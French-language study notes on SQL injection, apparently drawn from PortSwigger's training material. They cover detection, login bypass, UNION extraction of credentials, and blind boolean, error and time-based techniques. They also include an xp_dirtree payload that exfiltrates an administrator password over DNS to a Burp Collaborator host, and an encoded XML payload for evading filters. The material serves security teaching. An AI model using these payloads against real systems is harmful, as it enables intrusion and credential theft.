# SQL Injection Detection

## Techniques manuelles

- **Tester le simple guillemet `'`**  
  Soumettre un `'` dans chaque champ pour voir si une erreur SQL ou un comportement anormal apparaît.

- **Utiliser une syntaxe SQL spécifique**  
  Injecter des expressions qui devraient soit retourner la même valeur que l’original, soit changer le résultat, et observer les réponses de l’application.

- **Tester des conditions booléennes `OR 1=1` et `OR 1=2`**  
  Ajouter `OR 1=1` (toujours vrai) puis `OR 1=2` (toujours faux) et comparer les différences de comportement.

- **Payloads de délai temporel**  
  Envoyer une requête qui déclenche un délai (ex : `SLEEP(5)`) et mesurer si la réponse met plus de temps à arriver.

- **Payloads OAST (out-of-band)**  
  Injecter des charges utiles qui génèrent une interaction réseau externe (ex: via Burp Collaborator) et surveiller les interactions déclenchées.

## Outils automatisés

- **Burp Scanner**  
  Permet de détecter rapidement et de façon fiable la majorité des vulnérabilités SQLi.

---

# SQL Injection — Différents emplacements dans la requête

La majorité des vulnérabilités SQLi se trouvent dans la clause WHERE d’une requête SELECT, mais elles peuvent apparaître ailleurs dans différents types de requêtes SQL.


## Exemples de points d’injection

### Dans une requête UPDATE
Injection possible dans les valeurs à modifier ou dans la clause WHERE.  
*Exemple :* `UPDATE users SET email = 'injection' WHERE id = 1;`

### Dans une requête INSERT
Injection possible dans les valeurs insérées.  
*Exemple :* `INSERT INTO users (username, email) VALUES ('injection', 'test@test.com');`

### Dans une requête SELECT
Injection possible dans le nom de la table ou des colonnes (parfois via des paramètres dynamiques).  
*Exemple :* `SELECT * FROM [table_injection] WHERE ...;`

### Dans une clause ORDER BY
Injection possible dans le champ de tri, surtout si le nom de la colonne est injecté dynamiquement.  
*Exemple :* `SELECT * FROM users ORDER BY [column_injection];`

**À retenir**  
Les vulnérabilités SQLi ne se limitent pas à la clause WHERE ; toute partie d’une requête construite dynamiquement peut être une cible.

---
# Retrieving Hidden Data

Quand aucune défense contre l’injection SQL n’est présente, il est possible de manipuler la requête pour afficher des données cachées.

## Exemple d’injection avec commentaire SQL

**Payload :**  
`https://insecure-website.com/products?category=Gifts'--`

**Requête SQL générée :**  
`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

**Explication :**  
`--` indique un commentaire en SQL. Tout ce qui suit est ignoré, ce qui supprime le filtre `AND released = 1` et affiche tous les produits, même non publiés.

## Exemple avec condition toujours vraie

**Payload :**  
`https://insecure-website.com/products?category=Gifts'+OR+1=1--`

**Requête SQL générée :**  
`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

**Explication :**  
`OR 1=1` est toujours vrai, donc tous les produits sont affichés, quelle que soit la catégorie.

### Avertissement
Ajouter `OR 1=1` dans une requête peut causer des dégâts si la même donnée est réutilisée dans des requêtes UPDATE ou DELETE, entraînant une perte de données accidentelle.

---

# Subverting Application Logic

Il est possible de contourner la vérification du mot de passe lors de la connexion en injectant un commentaire SQL pour supprimer la vérification dans la requête.


## Exemple de requête de connexion classique

SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

Si un utilisateur est retourné, la connexion est acceptée.


## Exploitation de l’injection

- Username : `administrator'--`
- Password : (laisser vide)

La requête devient alors :

SELECT * FROM users WHERE username = 'administrator'--' AND password = ''

Le `--` commente la suite de la requête, supprimant la vérification du mot de passe.  
L’attaquant est ainsi connecté comme administrateur sans connaître le mot de passe.

---

# SQL Injection UNION Attacks

Lorsqu’une application vulnérable à l’injection SQL affiche les résultats de la requête, il est possible d’utiliser le mot-clé `UNION` pour récupérer des données provenant d’autres tables.


## Fonctionnement de l’attaque UNION

Le mot-clé `UNION` permet d’exécuter une ou plusieurs requêtes SELECT supplémentaires et d’ajouter leurs résultats à ceux de la requête d’origine.

**Exemple :**

SELECT a, b FROM table1 UNION SELECT c, d FROM table2

Cette requête retourne un seul jeu de résultats avec deux colonnes, contenant les valeurs de `a` et `b` de `table1` puis celles de `c` et `d` de `table2`.

L’attaque UNION permet ainsi de lire des informations issues de n’importe quelle table accessible via l’injection.

---

# SQL Injection UNION Attacks — Contraintes

Pour qu’une requête UNION fonctionne lors d’une injection SQL, deux conditions doivent être respectées :

- Les requêtes combinées doivent retourner le même nombre de colonnes.
- Les types de données de chaque colonne doivent être compatibles entre elles.

## Prérequis pour réussir une attaque UNION

- Identifier le nombre de colonnes retournées par la requête d’origine.
- Repérer les colonnes ayant un type de données compatible avec celles de la requête injectée.

Ces étapes sont essentielles pour que l’injection via UNION fonctionne et affiche les résultats attendus.

---
# Déterminer le nombre de colonnes nécessaires

Lors d’une attaque SQL injection via UNION, il faut connaître le nombre de colonnes retournées par la requête initiale.

## Méthode avec ORDER BY

Injecter successivement des clauses ORDER BY avec des index croissants :

- `' ORDER BY 1--`
- `' ORDER BY 2--`
- `' ORDER BY 3--`
- etc.

Chaque requête trie selon une colonne d’index donné. Quand l’index dépasse le nombre réel de colonnes, une erreur SQL est générée (par exemple : "ORDER BY position number 3 is out of range").

Même si l’application retourne un message d’erreur, une réponse générique ou aucun résultat, une différence de comportement permet d’inférer le nombre exact de colonnes retournées.

---
# Déterminer le nombre de colonnes — Méthode UNION SELECT

Une autre méthode consiste à injecter des requêtes UNION SELECT avec un nombre croissant de valeurs NULL :

- `' UNION SELECT NULL--`
- `' UNION SELECT NULL,NULL--`
- `' UNION SELECT NULL,NULL,NULL--`
- etc.

Si le nombre de NULL ne correspond pas au nombre de colonnes, une erreur SQL s’affiche (par exemple : "All queries combined using a UNION must have an equal number of expressions in their target lists").

NULL fonctionne avec tous les types de colonnes, donc cette méthode maximise les chances de succès.

Quand le bon nombre de NULL est trouvé, la requête fonctionne et la réponse HTTP peut afficher une ligne supplémentaire (souvent remplie de valeurs nulles), ou se comporter différemment selon le code de l’application.  
Attention : si la réponse ne change pas, cette méthode peut ne pas fonctionner.

---
# Syntaxe spécifique aux bases de données

Certaines bases de données ont des exigences particulières pour les requêtes SQL injectées.


## Oracle

Chaque requête SELECT doit inclure FROM et une table valide.
- Utiliser la table intégrée `dual` :  
  `' UNION SELECT NULL FROM DUAL--`

---

## MySQL

Le double tiret `--` doit être suivi d’un espace pour marquer un commentaire.  
On peut aussi utiliser le caractère dièse `#` pour indiquer un commentaire.  
- Exemples :  
  `' UNION SELECT NULL-- `  
  `' UNION SELECT NULL#`

Pour plus de détails sur la syntaxe spécifique aux différents SGBD, consulter [Cheat Sheet SGBD](https://portswigger.net/web-security/sql-injection/cheat-sheet).

---

# Trouver les colonnes compatibles avec les chaînes de caractères

Lors d'une attaque SQL injection UNION, il est important d’identifier les colonnes pouvant contenir des chaînes, car les données intéressantes sont souvent sous forme de texte.


## Méthode

Après avoir déterminé le nombre de colonnes, injecter une valeur texte dans chaque colonne à tour de rôle :

- `' UNION SELECT 'a',NULL,NULL,NULL--`
- `' UNION SELECT NULL,'a',NULL,NULL--`
- `' UNION SELECT NULL,NULL,'a',NULL--`
- `' UNION SELECT NULL,NULL,NULL,'a'--`


Si une colonne n'est pas compatible avec le type string, une erreur apparaît (ex : "Conversion failed when converting the varchar value 'a' to data type int").
Si aucune erreur ne se produit et que la réponse de l’application affiche la valeur injectée, la colonne est adaptée pour extraire des données textuelles.

---

# UNION extraire des données sensibles

Après avoir trouvé le nombre de colonnes et celles acceptant des chaînes, il devient possible d’extraire des informations de la base.

## Exemple d’extraction de données

Si la requête d’origine retourne deux colonnes de type chaîne, et qu’il existe une table `users` avec les colonnes `username` et `password`, on peut injecter :

`' UNION SELECT username, password FROM users--`

Cette injection affichera les identifiants présents dans la table `users`.

Pour réussir cette attaque, il faut connaître ou deviner le nom des tables et colonnes. Les bases de données modernes permettent de consulter leur structure pour obtenir ces informations.

---

# Extraire plusieurs valeurs dans une seule colonne

Quand la requête ne retourne qu’une seule colonne, il est possible de concaténer plusieurs champs dans cette colonne à l’aide d’un séparateur.


## Exemple (Oracle)

Injection :
' UNION SELECT username || '~' || password FROM users--

Le double pipe `||` permet la concaténation de chaînes sur Oracle. Ici, `username` et `password` sont fusionnés dans une seule colonne avec `~` comme séparateur.

Résultat attendu :
administrator~s3cure  
wiener~peter  
carlos~montoya  

Pour la syntaxe de concaténation selon chaque SGBD, voir [Cheat Sheet SGBD](https://portswigger.net/web-security/sql-injection/cheat-sheet) pour plus de détails sur les différences.

---
# Identifier le type et la version de la base de données

Il est possible d’identifier le type et la version du SGBD en injectant des requêtes spécifiques selon le fournisseur.


## Requêtes courantes pour obtenir la version

| SGBD                 | Requête                         |
|----------------------|---------------------------------|
| Microsoft, MySQL     | SELECT @@version                |
| Oracle               | SELECT * FROM v$version         |
| PostgreSQL           | SELECT version()                |

## Exemple d’injection

' UNION SELECT @@version--

Si la base de données est Microsoft SQL Server, la réponse peut contenir :

Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)  
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)

Pour d’autres requêtes spécifiques aux SGBD, consulter [Cheat Sheet SGBD](https://portswigger.net/web-security/sql-injection/cheat-sheet).

---
# Lister le contenu de la base de données

La plupart des SGBD (sauf Oracle) disposent de vues *information_schema* permettant d’explorer la structure de la base.

## Lister les tables

| SGBD                     | Requête                                         |
|--------------------------|-------------------------------------------------|
| MySQL, PostgreSQL, SQL Server | SELECT * FROM information_schema.tables         |

Exemple de résultat :

| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE  |
|---------------|--------------|------------|-------------|
| MyDatabase    | dbo          | Products   | BASE TABLE  |
| MyDatabase    | dbo          | Users      | BASE TABLE  |
| MyDatabase    | dbo          | Feedback   | BASE TABLE  |

## Lister les colonnes d’une table

| SGBD                     | Requête                                                                 |
|--------------------------|-------------------------------------------------------------------------|
| MySQL, PostgreSQL, SQL Server | SELECT * FROM information_schema.columns WHERE table_name = 'Users'      |

Exemple de résultat :

| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | DATA_TYPE |
|---------------|--------------|------------|-------------|-----------|
| MyDatabase    | dbo          | Users      | UserId      | int       |
| MyDatabase    | dbo          | Users      | Username    | varchar   |
| MyDatabase    | dbo          | Users      | Password    | varchar   |

Pour d’autres requêtes selon chaque SGBD, consulter [Cheat Sheet SGBD](https://portswigger.net/web-security/sql-injection/cheat-sheet).
---

# Blind SQL Injection

Blind SQL injection se produit lorsqu’une application est vulnérable à l’injection SQL, mais que ses réponses HTTP ne montrent ni le résultat de la requête, ni de messages d’erreur SQL.

| Caractéristique                        | Détail                                                           |
|----------------------------------------|------------------------------------------------------------------|
| Résultat visible dans la réponse ?     | Non                                                              |
| Message d’erreur SQL affiché ?         | Non                                                              |
| Exploitable via attaque UNION ?        | Non                                                              |
| Techniques requises                    | Exploitation “à l’aveugle” : booléenne, temporelle, etc.         |

Même sans retour direct, il est possible d’extraire des données non autorisées en utilisant des techniques adaptées à l’injection aveugle.

---

# Exploiter une blind SQL injection via des réponses conditionnelles

Il est possible d’exploiter une vulnérabilité blind SQLi en provoquant un comportement différent selon que la condition injectée est vraie ou fausse, même sans retour direct de la base.

Par exemple, une application vérifie un cookie TrackingId via :
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'

Si le TrackingId existe, la réponse affiche « Welcome back », sinon rien de spécial.  
En injectant une condition (ex : `' OR 1=1--`), il est possible de déclencher ou non ce message, ce qui permet de tester la véracité de conditions et de reconstruire des données sensibles caractère par caractère.

L’exploitation repose donc sur l’observation de changements subtils dans la réponse HTTP.

---
# Exploiter une blind SQL injection via des réponses conditionnelles (suite)

Pour exploiter ce type de faille, on injecte une condition dans la valeur du cookie, par exemple :
- …xyz' AND '1'='1
- …xyz' AND '1'='2

La première requête renverra le message "Welcome back" (car la condition est vraie), la seconde non (car la condition est fausse).

Ce mécanisme permet de tester n’importe quelle condition (caractère par caractère, bit par bit, etc.) et d’extraire des données de la base de façon itérative, simplement en observant la différence de comportement de l’application.

---

# Exploiter une blind SQLi en bruteforçant caractère par caractère

Pour extraire une donnée (ex : le mot de passe de l’utilisateur Administrator), il est possible d’injecter des conditions sur chaque caractère.

Exemple d’injection dans le cookie :
- xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm

Si le message "Welcome back" s’affiche, le premier caractère du mot de passe est supérieur à ‘m’.

On teste ensuite d’autres caractères :
- xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't

Pas de "Welcome back" : le caractère n’est pas supérieur à ‘t’.

On affine jusqu’à trouver la bonne lettre :
- xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's

Quand "Welcome back" apparaît, on a trouvé le premier caractère.  
On recommence pour les caractères suivants afin de reconstituer le mot de passe entier.

**Note :** la fonction SUBSTRING peut s’appeler SUBSTR selon le SGBD utilisé.

---

# Error-based SQL Injection

L’injection SQL basée sur les erreurs consiste à exploiter les messages d’erreur générés par la base pour extraire ou deviner des données sensibles, même en contexte “blind”.

- Il est parfois possible de forcer l’application à retourner un message d’erreur spécifique selon le résultat d’une expression booléenne.  
  → Cela permet d’exploiter la faille comme avec les réponses conditionnelles (voir section précédente).

- Certains messages d’erreur détaillés peuvent afficher directement le contenu de la requête SQL ou les données extraites.  
  → Une faille “blind” devient alors exploitable de façon visible.

Pour plus de détails sur l’exploitation via erreurs conditionnelles ou messages SQL verbeux, voir les chapitres dédiés à ces techniques.

---

# Exploiter une blind SQL injection via erreurs conditionnelles

Certaines applications n’affichent aucun changement de comportement, peu importe le résultat de la requête SQL.  
Dans ce cas, il est possible d’exploiter la faille en provoquant une erreur SQL uniquement lorsque la condition injectée est vraie.

Si l’erreur apparaît (par exemple un message d’erreur ou un comportement inattendu), on sait que la condition était vraie.  
Si rien ne se passe, la condition était fausse.

Cette méthode permet d’extraire de l’information bit par bit, même sans modification visible dans la réponse, simplement en observant la survenue d’une erreur.

---

# Exploiter une blind SQLi en déclenchant des erreurs conditionnelles

Pour exploiter cette méthode, il suffit d’injecter une requête qui provoque une erreur uniquement si la condition est vraie.

Exemple d’injection dans le cookie TrackingId :
- xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
  - Pas d’erreur (la condition est fausse)
- xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
  - Erreur (division par zéro car la condition est vraie)

Si la réponse HTTP change en cas d’erreur, on peut alors déterminer la véracité de la condition injectée.

Pour extraire un mot de passe caractère par caractère :
- xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a

**Note :** Il existe plusieurs façons de provoquer des erreurs conditionnelles selon le SGBD utilisé.

---

# Extraire des données sensibles via des messages d’erreur SQL verbeux

Une mauvaise configuration peut rendre les messages d’erreur SQL très détaillés, ce qui facilite l’exploitation.

Exemple :  
Après injection d’un simple guillemet dans le paramètre `id`, la base retourne :  
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char

Ce type d’erreur affiche la requête complète générée, révélant l’endroit exact où l’injection a lieu (ici, dans une chaîne entre guillemets dans la clause WHERE).  
Il devient alors plus simple de construire un payload valide (par exemple en commentant le reste de la requête pour éviter une erreur de syntaxe).

En résumé : les messages d’erreur détaillés peuvent grandement aider à affiner les injections SQL.

---

# Extraire des données sensibles via les messages d’erreur détaillés

Il est parfois possible de forcer l’application à générer un message d’erreur qui contient directement des données issues de la requête, rendant visible une injection normalement aveugle.

La fonction `CAST()` permet de provoquer ce type d’erreur :  
Par exemple, si la requête contient :  
CAST((SELECT example_column FROM example_table) AS int)

Si `example_column` contient une chaîne de caractères, la conversion échoue et retourne une erreur comme :  
ERROR: invalid input syntax for type integer: "Example data"

La donnée sensible (“Example data”) est alors affichée dans le message d’erreur.

**Astuce** : Cette méthode peut aussi être utile si une limite de caractères t’empêche de faire des injections conditionnelles classiques.

---

# Exploiter une blind SQL injection en provoquant des délais temporels

Si l’application gère les erreurs SQL sans afficher de différence dans la réponse, il reste possible d’exploiter la faille en provoquant des délais conditionnels.

Le principe : injecter une condition qui déclenche un délai (ex : SLEEP ou WAITFOR) si elle est vraie. Comme les requêtes SQL sont traitées de façon synchrone, le temps de réponse HTTP reflète la véracité de la condition.

En mesurant le délai de réponse, il est possible de déterminer si la condition injectée est vraie ou fausse, et ainsi extraire des données de manière “aveugle”.

---

# Exploiter une blind SQLi avec délais temporels

Les techniques pour déclencher un délai dépendent du SGBD utilisé.

Exemple sur Microsoft SQL Server :
- `'; IF (1=2) WAITFOR DELAY '0:0:10'--`  → Pas de délai (condition fausse)
- `'; IF (1=1) WAITFOR DELAY '0:0:10'--`  → Délai de 10 s (condition vraie)

On peut extraire des données caractère par caractère :
- `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

Si la réponse met plus de temps à arriver, la condition est vraie ; sinon, elle est fausse.

Les fonctions de délai varient selon les SGBD (ex : SLEEP(), pg_sleep(), WAITFOR DELAY).

---

# Exploiter une blind SQL injection avec des techniques OAST (out-of-band)

Si la requête SQL est exécutée de façon asynchrone (dans un autre thread), les techniques classiques (conditionnelle, erreur, délai) ne fonctionnent pas.

Dans ce cas, il est possible d’exploiter la faille en provoquant des interactions réseau vers un système contrôlé (OAST).  
Exemple : injecter une requête qui déclenche une connexion DNS ou HTTP vers ton serveur, selon une condition.

Cette méthode permet soit d’inférer la vérité d’une condition, soit d’exfiltrer directement des données via le trafic réseau généré par la base.

Le protocole le plus utilisé est DNS, car il passe souvent les firewalls en production.

Pour réussir, il faut disposer d’un serveur contrôlé pour recevoir et observer ces requêtes sortantes.

---

# Exploiter une blind SQLi avec OAST (suite)

L’outil le plus simple et fiable pour exploiter les techniques OAST est **Burp Collaborator**.  
Ce serveur permet de détecter et d’analyser les requêtes réseau déclenchées par l’injection, notamment DNS.

Sur Microsoft SQL Server, il est possible de forcer une requête DNS avec :
`; exec master..xp_dirtree '//<sous-domaine>.burpcollaborator.net/a'--`

La base va alors résoudre le nom de domaine spécifié, ce qui est détecté dans Burp Collaborator.

Il suffit de générer un sous-domaine unique avec Burp Collaborator, d’injecter le payload, puis de surveiller les requêtes DNS reçues pour valider et exfiltrer des données.

Pour plus de détails, voir la documentation officielle de Burp Collaborator.

---

# Exfiltrer des données via OAST (out-of-band) en blind SQLi

Une fois qu’il est possible de déclencher des interactions out-of-band, il est possible d’exfiltrer des données sensibles.

Exemple sur Microsoft SQL Server :

`'; declare @p varchar(1024); set @p=(SELECT password FROM users WHERE username='Administrator'); exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`


Ce payload lit le mot de passe d’Administrator, l’intègre dans une requête DNS, et la base effectue la requête vers ton sous-domaine Collaborator, révélant ainsi le mot de passe (ex :  
`S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`).

Les techniques OAST permettent une exfiltration directe, et sont souvent à privilégier même quand d’autres méthodes sont possibles.

---

# Injection SQL dans différents contextes

Les injections SQL ne sont pas limitées aux paramètres d’URL : toute donnée contrôlable par l’utilisateur, traitée en requête SQL par l’application, peut être vulnérable (JSON, XML, headers…).

Différents formats (JSON, XML…) offrent aussi des moyens d’obfusquer les payloads pour contourner les protections (WAF, filtres…).  
Par exemple, il est possible d’encoder ou d’échapper certains caractères dans les mots-clés interdits.

Exemple d’injection SQL via XML, avec séquence d’échappement pour le caractère ‘S’ dans SELECT :
```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

Cette séquence est décodée côté serveur avant l’exécution SQL, permettant de contourner certains filtres applicatifs.

---

# Second-order SQL Injection

Une injection SQL de “premier ordre” se produit quand une entrée utilisateur est insérée dans une requête SQL de manière non sécurisée, dès la réception de la requête HTTP.

Une **second-order SQL injection** se produit quand l’entrée utilisateur est d’abord stockée (par exemple en base) sans être dangereuse à ce moment-là, puis est réutilisée plus tard dans une requête SQL vulnérable.

Ce type de faille survient souvent car le développeur considère la donnée comme “sûre” lors de sa réutilisation, alors qu’elle provient initialement d’un utilisateur et peut contenir un payload.

On parle aussi de “stored SQL injection”.

---


